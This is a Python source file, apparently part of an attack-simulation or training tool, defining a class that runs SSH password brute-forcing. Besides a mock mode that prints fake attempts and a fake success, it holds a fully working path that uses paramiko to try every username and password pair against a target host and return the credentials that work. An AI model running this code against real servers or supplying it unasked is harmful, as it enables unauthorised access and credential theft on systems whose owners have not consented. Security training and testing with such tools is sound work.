import paramiko
import time

class BruteForceSimulator:
    def __init__(self, logger):
        self.logger = logger

    def ssh_brute_force(self, target_ip, user_list, password_list, port=22, simulate=False):
        self.logger.log_event("BruteForce", "Start", f"Target: {target_ip}:{port}")
        print(f"[*] Initiating SSH Brute Force Attack on {target_ip}:{port}")
        print(f"[*] Loaded {len(user_list)} usernames and {len(password_list)} passwords.")
        time.sleep(1)
        
        if simulate:
            self.logger.log_event("BruteForce", "Info", "Running in SIMULATION mode (no real connection)")
            print("[!] SIMULATION MODE ACTIVE: Mocking network responses...")
            
            # Simulate some failures first
            for user in user_list[:1]:
                for pw in password_list[:2]:
                    print(f"  > Trying {user} : {pw} ...", end=" ", flush=True)
                    self.logger.log_event("BruteForce", "Attempt", f"Trying {user}/{pw}")
                    time.sleep(0.8)
                    print(f"\033[91m[ACCESS DENIED]\033[0m")
                    self.logger.log_event("BruteForce", "Failed", f"Invalid: {user}/{pw}")
            
            # Simulate success
            success_user = user_list[-1]
            success_pw = password_list[-1]
            print(f"  > Trying {success_user} : {success_pw} ...", end=" ", flush=True)
            self.logger.log_event("BruteForce", "Attempt", f"Trying {success_user}/{success_pw}")
            time.sleep(1.2)
            print(f"\033[92m[SUCCESS]\033[0m")
            print(f"[*] Credentials Cracked: {success_user}@{target_ip} -> {success_pw}")
            
            self.logger.log_event("BruteForce", "Success", f"Credentials found: {success_user}/{success_pw}", status="SUCCESS")
            self.logger.log_event("BruteForce", "End", "Credentials found")
            return (success_user, success_pw)

        for user in user_list:
            for password in password_list:
                try:
                    self.logger.log_event("BruteForce", "Attempt", f"Trying {user}/{password}")
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(target_ip, port=port, username=user, password=password, timeout=3)
                    self.logger.log_event("BruteForce", "Success", f"Credentials found: {user}/{password}", status="SUCCESS")
                    client.close()
                    return (user, password)
                except paramiko.AuthenticationException:
                    self.logger.log_event("BruteForce", "Failed", f"Invalid: {user}/{password}")
                except Exception as e:
                    self.logger.log_event("BruteForce", "Error", f"Connection error: {e}", status="ERROR")
                    
        self.logger.log_event("BruteForce", "End", "No credentials found")
        return None
